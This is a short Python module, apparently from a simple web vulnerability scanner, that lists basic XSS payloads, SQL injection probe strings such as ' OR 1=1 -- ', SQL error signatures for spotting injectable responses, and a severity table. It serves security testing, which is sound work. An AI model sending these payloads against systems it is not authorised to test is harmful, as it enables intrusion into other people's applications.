# payloads.py
# simple test payloads and helpers

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>window._test=1</script>",
    "<img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "'", "\"", " OR 1=1 -- ", " OR '1'='1' -- "
]

# common SQL error signatures for simple server response checks
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "syntax error at or near",
    "unclosed quotation mark after the character string",
    "pg_query()",
    "sql syntax"
]

# severity mapping
SEVERITY = {
    "xss": "High",
    "sqli": "High",
    "csrf": "Medium",
    "info": "Low"
}
